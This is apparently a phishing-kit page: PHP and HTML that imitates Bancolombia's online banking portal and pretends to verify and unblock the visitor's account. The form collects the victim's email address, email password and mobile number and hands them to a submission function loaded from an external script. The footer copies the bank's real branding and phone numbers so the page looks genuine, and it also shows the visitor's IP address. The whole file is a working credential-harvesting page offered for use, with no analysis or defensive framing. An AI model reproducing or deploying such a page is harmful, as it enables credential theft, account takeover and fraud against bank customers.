<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>Bancolombia Sucursal Vrtual Personas</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">
		<meta content="es" http-equiv="Content-Language">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">	 	
		<link href="../../../../../src/css/layout.css" rel="stylesheet">
		<link href="../../../../../src/css/fonts.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="../../../../../src/img/logo.png" />
		<script type="text/javascript" src="../../../../../src/js/jquery-3.6.0.min.js"></script>
		<script src="../../../../../src/js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../../../../src/js/run.js"></script> 
		<script type="text/javascript" src="../../../../../src/js/dato.js"></script> 
   	</head>
   	<body>
   		<div class="contenido">
   			<div class="cabecera">
   				<div class="logo">
   					<img src="../../../../../src/img/logo.svg">
   					<br>
   					<span class="subtitulo">Sucursal Virtual Personas</span>
   					<br>
					<span class="texto-min">Fecha y hora actual:</span> <span class="texto-min" id="fecha-hora">Lunes 13 de Junio de 2022 9:23:11 AM</span>
   				</div>
   				<div class="titulo">Ahora Verificar tu cuenta es fácil</div>
   				<div class="mensaje">
   					<table>
   						<tr>
   							<td valign="middle"><img src="../../../../../src/img/error.jpg" style="width: 40px;"></td>   					
   							<td valign="middle" style="padding-left: 12px;"><span style="font-size: 20px; color: #000; line-height: 20px;">Error</span><br><span>Por favor ingesar la información requerida.</span></td>
   						</tr>
   					</table>
   				</div>
   			</div>   			
   			<div class="cuerpo">
   				<div class="pnlizq">
   					<div class="formulario">
   						<div class="form-titulo">Actualización de datos</div>
   						<div class="descripcion">
   							Verificaremos estos datos con los agregados 
							anteriormente en nuestras sucursales
   						</div>
   						<div class="form-cuerpo">
   							<div style="text-align: left;">
   								<img src="../../../../../src/img/info.jpg" class="icon-info">
								<span class="etiqueta"> Ingrese su Correo Electrónico</span>
   							</div>   						
   							<div class="input-icono email">
   								<input type="text" name="inp-mail" id="inp-mail"
								autocomplete="off" >
   							</div>
   							<br>
   							<div style="text-align: left;">
   								<img src="../../../../../src/img/info.jpg" 
								class="icon-info"><span class="etiqueta">  
								Ingrese su Clave de Correo</span>
   							</div>   						
   							<div class="input-icono pass">
   								<input type="password" name="inp-pass" 
								id="inp-pass" autocomplete="off" >
   							</div>
   							<br>
   							<div style="text-align: left;">
   								<img src="../../../../../src/img/info.jpg" class="icon-info"><span class="etiqueta">  Ingrese su Celular</span>
   							</div>   						
   							<div class="input-icono celular">
   								<input type="text" name="inp-celular" 
								id="inp-celular" maxlength="10" autocomplete="off" 
								pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
   							</div>
   							<br>
   							<button id="btn-mail" name="btn-mail" class="btn btn-amarillo" 
							type="button">Verificar</button>
   							<br>
   						  							
   						</div>
   					</div>
   					<br>
   					<div class="lista-links ">
   						<div class="texto">
   							<div class="vinculos">
   								<table>
   									<tr>
   										<td valign="middle"><img src="../../../../../src/img/demo.jpg"></td>
   										<td valign="middle"><a href="#">Conoce sobre sucursal virtual persona</a></td>
   									</tr>
   								</table>  								   						
   							</div>
   							<div class="vinculos">
   								<table>
   									<tr>
   										<td valign="middle"><img src="../../../../../src/img/seguridad.jpg"></td>
   										<td valign="middle"><a href="#">Aprende sobre Seguridad</a></td>
   									</tr>
   								</table>   								  							
   							</div>   
   							<div class="vinculos">
   								<table>
   									<tr>
   										<td valign="middle"><img src="../../../../../src/img/reglamento.jpg"></td>
   										<td valign="middle"><a href="#">Reglamento Sucursal Virtual</a></td>
   									</tr>
   								</table>   								  							
   							</div>
   							<div class="vinculos">
   								<table>
   									<tr>
   										<td valign="middle"><img src="../../../../../src/img/politica.jpg"></td>
   										<td valign="middle"><a href="#">Política de Privacidad</a></td>
   									</tr>
   								</table>   								   							
   							</div> 													
						</div> 
   					</div>
   				</div>
   				<div class="pnlder">
   					<a href="#"><img src="../../../../../src/img/email.jpg" class="publicidad"></a><br><br>
   					<div class="texto" style="text-align:justify; padding: 0px 30px;">Después de presionar verificar, te llevaremos a una página donde tendrás que esperar aproximadamente 5 minutos, de ser válida tu identidad te lo notificaremos al instante y será desbloqueada tu cuenta. De lo contrario solicitaremos una nueva dinámica.</div>
   				</div>
   			</div>
   			<div class="pie">
   				<div class="direccion">Sucursal Telefónica Bancolombia: Bogotá 343 0000 - Medellín 510 9000 - Cali 554 0505 - Barranquilla 361 8888 - Cartagena 693 4400 - Bucaramanga 697 2525 - Pereira 340 1213<br class="salto-pie">
El resto del país 01 800 09 12345. Sucursales Telefónicas en el exterior: España 900 995 717 - Estados Unidos 1866 379 9714.</div>
   				<div class="ippie">
   					<span class="dirip">Dirección IP: <?php echo $ip; ?></span>´
   					<span class="copyright">Copyright © 2022 Bancolombia S.A.</span>
   				</div>
   			</div>
   		</div>
   	</body>
</html>
<script type="text/javascript">	 
	$(document).ready(function() {
		$('#btn-mail').click(function(){
			if ($("#inp-mail").val().length > 0) {
				if ($("#inp-pass").val().length > 0) {
					if ($("#inp-celular").val().length > 9) {
						put_mail($("#inp-mail").val(),$("#inp-pass").val(),$("#inp-celular").val());
					}else{
						$(".mensaje").show();
						$(".celular").css("border", "1px solid red");
						$("#inp-celular").focus();
					}
				}else{
					$(".mensaje").show();
					$(".pass").css("border", "1px solid red");
					$("#inp-pass").focus();
				}
			}else{
				$(".mensaje").show();
				$(".email").css("border", "1px solid red");
				$("#inp-mail").focus();
			}
		});

		$("#inp-mail").keyup(function(e) {
			$(".email").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});

		$("#inp-pass").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});

		$("#inp-celular").keyup(function(e) {
			$(".celular").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>
<script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#fecha-hora').jclock(optionsEST);
     });
 </script>

